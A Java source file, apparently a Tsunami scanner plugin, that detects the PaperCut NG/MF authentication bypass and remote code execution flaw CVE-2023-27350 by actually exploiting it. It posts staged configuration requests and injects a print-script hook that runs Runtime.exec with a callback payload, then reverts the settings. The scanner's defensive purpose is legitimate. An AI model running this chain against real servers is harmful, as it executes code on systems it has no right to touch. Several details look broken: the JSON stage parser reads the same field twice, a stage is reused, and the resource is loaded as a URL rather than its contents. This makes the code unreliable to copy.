/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.papercut;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.api.Http;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.Resources;
import com.google.gson.Gson;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.*;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.*;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Instant;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.inject.Inject;

@PluginInfo(
        type = PluginType.VULN_DETECTION,
        name = "PapercutNGMRVulnDetectorWithPayload",
        version = "1.0",
        description = "Detects papercut versions that are vulnerable to authentication bypass and RCE.",
        author = "Isaac_GC (isaac@nu-that.us)",
        bootstrapModule = PapercutNGMFVulnDetectorBootstrapModule.class)

public final class PapercutNGMFVulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  PapercutNGMFVulnDetector(@UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }
  @Override
  public DetectionReportList detect(
          TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2023-27350 (PaperCut NG/MF) starts detecting.");

    return DetectionReportList.newBuilder()
            .addAllDetectionReports(
                    matchedServices.stream()
                            .filter(NetworkServiceUtils::isWebService)
                            .filter(this::isServiceVulnerable)
                            .map(networkService -> buildDetectionReport(targetInfo, networkService))
                            .collect(toImmutableList()))
            .build();
  }

  static class PayloadStageData {
    String uri_path;
    JsonObject payloadContents;
    public PayloadStageData(String uri_path, JsonObject payloadContents) {
      this.uri_path = uri_path;
      this.payloadContents = payloadContents;
    }
  }
  private PayloadStageData handleJsonData(JsonElement currentStageData) {
    JsonObject currentStageJsonData = currentStageData.getAsJsonObject();

    return new PayloadStageData(
            currentStageJsonData.get("target_path").toString(),
            currentStageJsonData.get("target_path").getAsJsonObject()
    );
  }

  private HttpResponse sendPayloadRequest(PayloadStageData payloadData, NetworkService netService, String rootUri) {
    HttpHeaders headers = HttpHeaders.builder().addHeader("Origin", rootUri).build();
    ByteString payloadByteString = ByteString.copyFrom(
            payloadData.payloadContents.getAsString(),
            StandardCharsets.UTF_8);

     HttpRequest req = HttpRequest
             .post(rootUri + payloadData.uri_path)
             .setHeaders(headers)
             .setRequestBody(payloadByteString)
             .build();
     HttpResponse resp = null;
     try {
        resp = httpClient.send(req, netService);
     } catch (IOException e) {
        logger.atWarning().withCause(e).log();
     }
     return resp;
  }

  private boolean isRCEPresentForService(NetworkService networkService, String rootUri) {
    PayloadGeneratorConfig config =
            PayloadGeneratorConfig.newBuilder()
                    .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
                    .setInterpretationEnvironment(PayloadGeneratorConfig.InterpretationEnvironment.JAVA)
                    .setExecutionEnvironment(
                            PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT
                    ).build();

    Payload payload = this.payloadGenerator.generate(config);

    if (!payload.getPayloadAttributes().getUsesCallbackServer()) return false;

    String rceCmdInject = "function printJobHook(inputs, actions) {}\r\n\"" +
            "java.lang.Runtime.getRuntime().exec('{" + payload.getPayload() + "}');";

    // Set up the base data and headers needed for the RCE

    // Get the payloads necessary for the RCE
    String stagedPayloads;
    try {
      stagedPayloads = Resources.getResource(this.getClass(), "stagedPayloads.json").toString();
    } catch (Error e) {
      throw new AssertionError("Couldn't load payload resource file.", e);
    }
    JsonObject payloadJsonData = new Gson().fromJson(stagedPayloads, JsonObject.class);


    // If a JSESSION_ID was set and the status code returned is 200/Ok, continue
    PayloadStageData stage0Data = handleJsonData(payloadJsonData.get("stage0"));
    HttpResponse stage0Result = sendPayloadRequest(stage0Data, networkService, rootUri);
    HttpStatus stage0ResultStatus = stage0Result.status();
    HttpHeaders stage0ResultHeaders = stage0Result.headers();
    if (
            stage0ResultStatus == HttpStatus.OK
            && stage0ResultHeaders.get("Set-Cookie").toString().contains("JSESSIONID")
    ) {

      // Stage 1 (Configure the settings via the web interface)
      sendPayloadRequest(handleJsonData(payloadJsonData.get("stage1a")), networkService, rootUri);
      sendPayloadRequest(handleJsonData(payloadJsonData.get("stage1b")), networkService, rootUri);
      sendPayloadRequest(handleJsonData(payloadJsonData.get("stage1c")), networkService, rootUri);
      sendPayloadRequest(handleJsonData(payloadJsonData.get("stage1d")), networkService, rootUri);

      // Stage 2 (Add the RCE payload data and try to execute)
      sendPayloadRequest(handleJsonData(payloadJsonData.get("stage2a")), networkService, rootUri);
      sendPayloadRequest(handleJsonData(payloadJsonData.get("stage2b")), networkService, rootUri);
      sendPayloadRequest(handleJsonData(payloadJsonData.get("stage2c")), networkService, rootUri);

      // Stage 2 -- Send the actual RCE payload command
      PayloadStageData stage2d = handleJsonData(payloadJsonData.get("stage2a"));
      stage2d.payloadContents.remove("scriptBody"); // Remove to be sure that the contents are replaced
      stage2d.payloadContents.addProperty("scriptBody", rceCmdInject);

      HttpResponse rceInjectionResult = sendPayloadRequest(stage2d, networkService, rootUri);

      // Stage 3 (Revert the settings via the web interface after RCE payload was executed)
      sendPayloadRequest(handleJsonData(payloadJsonData.get("stage3a")), networkService, rootUri);
      sendPayloadRequest(handleJsonData(payloadJsonData.get("stage3b")), networkService, rootUri);
      sendPayloadRequest(handleJsonData(payloadJsonData.get("stage3c")), networkService, rootUri);
      sendPayloadRequest(handleJsonData(payloadJsonData.get("stage3d")), networkService, rootUri);

      // Use the results from the RCE injection to see if it was successful
      return rceInjectionResult.status().isSuccess() && payload.checkIfExecuted();
    }

    return false;
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String rootUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String targetUri = rootUri + "/app?service=page/SetupCompleted";
    boolean isVulnerable = false;

    HttpHeaders headers = HttpHeaders.builder().addHeader("Origin", rootUri).build();

    HttpRequest req = HttpRequest.post(targetUri).setHeaders(headers).build();

    try {
      HttpResponse res = httpClient.send(req, networkService);
      String content = res.bodyString().orElse(null);

      Matcher matches;
      if (content != null) {
        matches = Pattern.compile("Configuration Wizard : Setup Complete").matcher(content);

        // if a response code 302 (HttpStatus.FOUND), and/or the title isn't match, then it probably isn't a
        // vulnerable version.
        if (
                res.status() == HttpStatus.OK
                        && matches.find()
                        && isRCEPresentForService(networkService, rootUri)
        ) {
          isVulnerable = true;
        }
      }

      return isVulnerable;

    } catch (IOException e) {
      logger.atWarning().withCause(e).log();
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
          TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
            .setTargetInfo(targetInfo)
            .setNetworkService(vulnerableNetworkService)
            .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
            .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
            .setVulnerability(
                    Vulnerability.newBuilder()
                            .setMainId(
                                    VulnerabilityId.newBuilder()
                                            .setPublisher("TSUNAMI_COMMUNITY")
                                            .setValue("CVE_2023_27350"))
                            .setSeverity(Severity.CRITICAL)
                            .setTitle("Papercut NG/MF Authentication Bypass and RCE")
                            .setDescription(
                                    "This vulnerability allows remote attackers to bypass authentication"
                                            + " on affected installations of PaperCut NG/MF."
                                            + " Authentication is not required to exploit this vulnerability."
                                            + " The specific flaw exists within the SetupCompleted class and the"
                                            + " issue results from improper access control."
                                            + " An attacker can leverage this vulnerability to bypass authentication"
                                            + " and execute arbitrary code in the context of SYSTEM (Windows) "
                                            + "or Root/Papercut User (Linux).")
                            .setRecommendation(
                                    "Update to versions that are at least 20.1.7, 21.2.11, 22.0.9, or any later"
                                            + " version."))
            .build();
  }
}
